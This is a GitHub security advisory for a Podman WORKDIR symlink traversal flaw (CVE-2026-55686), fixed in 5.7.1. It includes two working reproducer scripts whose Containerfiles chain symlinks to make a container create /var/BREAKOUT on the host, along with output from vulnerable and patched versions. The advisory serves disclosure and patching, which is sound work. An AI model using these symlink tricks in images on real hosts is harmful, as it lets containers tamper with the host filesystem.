# [M] Podman: WORKDIR symlink traversal vulnerability

## Summary
Severity: Medium
Advisory: GHSA-q6r4-3wmg-fwcq
CVE: CVE-2026-55686
CWE: CWE-59
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-q6r4-3wmg-fwcq
Type: github-advisory

## Affected
- Go: `github.com/containers/podman/v5` — affected >=0 <5.7.1
- Go: `github.com/containers/podman/v4` — affected >=0
- Go: `github.com/containers/podman/v3` — affected >=0

## Details
### Summary

Running a malicous container image where the WORKDIR path contains a symlink can create a directory or modify ownership on the host filesystem. Modified ownership is less likely to happen as that requires help from an untrusted/malicious process that mutates the host filesystem tree during dereferencing of the WORKDIR path, to trigger a race condition.

### Patch

https://github.com/podman-container-tools/podman/commit/d18e44e9abb3bf5b7294aa70806e1368fdddfdd0

### Details

This issue was fixed in podman 5.7.1 (git commit 7ce2e00ab140c11a68301f0b161f51984131a858)

### PoC

The reproducer script _test1.bash_ demonstrates the vulnerability. 
The directory  `/var/BREAKOUT` is created on the host.
The container process uses the container directory `/var/BREAKOUT` as current working directory.

The reproducer script _test2.bash_ demonstrates the same vulnerability. 
The directory  `/var/BREAKOUT` is created on the host.
The container process uses the container directory `/usr/local` as current working directory.

The reproducer script _test2.bash_ shows that the working directory can be different from the breakout directory.

Reproducer **test1.bash**

```
#!/bin/bash
set -o errexit
set -o nounset

if [ -e /var/BREAKOUT ]; then
  echo error: path /var/BREAKOUT should not exist beforehand
  exit 1
fi

dir=$(mktemp -d)
cat > $dir/Containerfile << 'EOF'
FROM docker.io/library/alpine
RUN cd / && ln -s ../../../../../../../var symlink
USER 1234:1234
WORKDIR /symlink/BREAKOUT
CMD ["/bin/sh","-c","echo current working directory: $(pwd)"]
EOF

podman build -q --no-cache -t img $dir
podman run --rm localhost/img
ls -ld /var/BREAKOUT
```


Reproducer **test2.bash**

```
#!/bin/bash
set -o errexit
set -o nounset

if [ -e /var/BREAKOUT ]; then
  echo error: path /var/BREAKOUT should not exist beforehand
  exit 1
fi

dir=$(mktemp -d)
cat > $dir/Containerfile << 'EOF'
FROM docker.io/library/alpine
ARG breakout_dirname=/var
ARG breakout_basename=BREAKOUT
ARG produce_pwd=/usr/local
RUN mkdir -p /0/1/2/3 && \
    cd /0 && \
    ln -s 1/2/3 symlink1 && \
    mkdir -p /0/1/symlink2/${breakout_dirname} && \
    cd /0/1/symlink2/${breakout_dirname} && \
    ln -s ${produce_pwd} ${breakout_basename}
RUN cd / && ln -s ../../../../../../.. symlink2
USER 1234:1234
WORKDIR /0/symlink1/../../symlink2/${breakout_dirname}/${breakout_basename}
CMD ["/bin/sh","-c","echo current working directory: $(pwd)"]
EOF

podman build -q --no-cache -t img $dir
podman run --rm localhost/img
ls -ld /var/BREAKOUT
```



Vulnerable:

podman 5.7.0 using Fedora CoreOS 43.20251120.3.0

```
root@localhost:~# bash test1.bash 
38c27b69c61941741f49c3f87b589b422391d5908659665cabf248934be0ed80
current working directory: /var/BREAKOUT
drwxr-xr-x. 2 1234 1234 6 May 29 19:28 /var/BREAKOUT
root@localhost:~# rmdir /var/BREAKOUT/
root@localhost:~# bash test2.bash 
c3390edbe393a3f3b182e60c5900cf93444b5120fbe34dc305478b3b77a106c9
current working directory: /usr/local
drwxr-xr-x. 2 1234 1234 6 May 29 19:28 /var/BREAKOUT
```

Not vulnerable:

podman 5.7.1 using Fedora CoreOS 43.20260119.1.1

```
root@localhost:~# bash test1.bash 
0229bf752a821d5b9bb8afcf4b94e8de2a4838798ae8065414b7f939b81d0788
current working directory: /var/BREAKOUT
ls: cannot access '/var/BREAKOUT': No such file or directory
root@localhost:~# bash test2.bash 
568584150a93a003feb8ae1985173bf50ced9cba4d52f9734cb70dc75eeb7c60
current working directory: /usr/local
ls: cannot access '/var/BREAKOUT': No such file or directory
```

### Credits

We like to thank Erik Sjölund (@eriksjolund) for reporting the security impact to us.

## References
- https://github.com/podman-container-tools/podman/security/advisories/GHSA-q6r4-3wmg-fwcq
- https://github.com/podman-container-tools/podman/commit/7ce2e00ab140c11a68301f0b161f51984131a858
- https://github.com/podman-container-tools/podman/commit/d18e44e9abb3bf5b7294aa70806e1368fdddfdd0
- https://github.com/podman-container-tools/podman
